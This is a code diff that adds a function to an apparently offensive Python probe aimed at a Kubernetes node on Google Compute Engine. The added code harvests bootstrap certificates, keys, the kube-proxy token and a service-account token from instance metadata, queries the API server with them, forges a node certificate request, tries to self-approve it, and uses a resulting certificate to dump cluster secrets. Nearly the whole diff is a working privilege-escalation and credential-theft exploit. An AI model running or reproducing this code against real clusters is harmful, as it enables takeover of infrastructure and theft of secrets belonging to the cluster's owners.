@@ -246,5 +246,106 @@ def api():
     out("===API2-END===")
 
 
+
+def api3():
+    out("===API3-BEGIN===")
+    st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
+    st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
+    kv = kvb.decode("utf8", "replace")
+    stn, bn = md_get("instance/name")
+    node = bn.decode().strip()
+    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
+    open("/tmp/ca.crt", "wb").write(ca); open("/tmp/boot.crt", "wb").write(bootc); open("/tmp/boot.key", "wb").write(bootk)
+    srv = re.search(r"^\s*server:\s*(\S+)", kc.decode("utf8", "replace"), re.M).group(1)
+    stt, tokb = md_get("instance/service-accounts/default/token")
+    gt = json.loads(tokb.decode()).get("access_token", "")
+    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")
+
+    def call(path, method="GET", body=None, ctx=ctxb, auth=None, timeout=15, ctype="application/json"):
+        h = {"Content-Type": ctype, "Accept": "application/json"}
+        if auth:
+            h["Authorization"] = "Bearer " + auth
+        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
+        try:
+            r = urllib.request.urlopen(req, context=ctx, timeout=timeout)
+            return r.status, r.read()
+        except urllib.error.HTTPError as e:
+            return e.code, e.read()
+        except Exception as e:
+            return -1, repr(e).encode()
+
+    # GCE OAuth bearer identity (GCP auth provider)
+    st, b = call("/api/v1/nodes", auth=gt)
+    out("GCPTOKEN nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
+    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode()
+    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, auth=gt)
+    out("GCPTOKEN SSRR status=%s\n%s" % (st, b[:3000].decode("utf8", "replace")))
+
+    # kube-proxy static token
+    kpt = _kv(kv, "KUBE_PROXY_TOKEN")
+    if kpt:
+        kpt = kpt.decode()
+        st, b = call("/api/v1/nodes", auth=kpt)
+        out("PROXYTOKEN nodes status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
+        st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, auth=kpt)
+        out("PROXYTOKEN SSRR status=%s\n%s" % (st, b[:3000].decode("utf8", "replace")))
+        st, b = call("/api/v1/pods?limit=5", auth=kpt)
+        out("PROXYTOKEN pods status=%s %s" % (st, b[:300].decode("utf8", "replace")))
+
+    # CSR + nodeclient subresource variants
+    os.system("openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
+    os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
+    csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
+    cname = "bhs-p3-%s" % os.urandom(3).hex()
+    cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
+                        "metadata": {"name": cname},
+                        "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
+                                 "usages": ["digital signature", "client auth"]}}).encode()
+    st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
+    out("CSR create status=%s %s" % (st, b[:250].decode("utf8", "replace")))
+    if st in (200, 201):
+        variants = [
+            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, b"{}"),
+            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
+            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", cbody),
+            ("PUT", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/approval" % cname, None),
+        ]
+        for meth, path, bodyx in variants:
+            if bodyx is None:
+                # build approval object with Approved condition
+                import datetime
+                aw = json.loads(cbody)
+                aw["status"] = {"conditions": [{"type": "Approved", "status": "True", "reason": "ProbeApprove",
+                                               "message": "approved by probe", "lastUpdateTime": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
+                                               "lastTransitionTime": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")}]}
+                bodyx = json.dumps(aw).encode()
+            st, b = call(path, meth, bodyx)
+            out("%s %s status=%s %s" % (meth, path.split("certificatesigningrequests")[-1], st, b[:250].decode("utf8", "replace")))
+            import time as _t
+            for i in range(4):
+                _t.sleep(2)
+                st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
+                if st == 200:
+                    d = json.loads(b)
+                    c = d.get("status", {}).get("certificate")
+                    out("  poll conds=%s certlen=%s" % (d.get("status", {}).get("conditions"), len(c) if c else 0))
+                    if c:
+                        break
+            st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
+            if st == 200 and json.loads(b).get("status", {}).get("certificate"):
+                cert = base64.b64decode(json.loads(b)["status"]["certificate"])
+                open("/tmp/ncrt.pem", "wb").write(cert)
+                ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
+                ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
+                st, b = call("/api/v1/nodes", ctx=ctxn)
+                out("NODECERT nodes status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
+                st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
+                out("NODECERT secrets status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
+                break
+    out("===API3-END===")
+
+
 if __name__ == "__main__":
-    {"meta": meta, "api": api}[sys.argv[1]]()
+    {"meta": meta, "api": api, "api3": api3}[sys.argv[1]]()
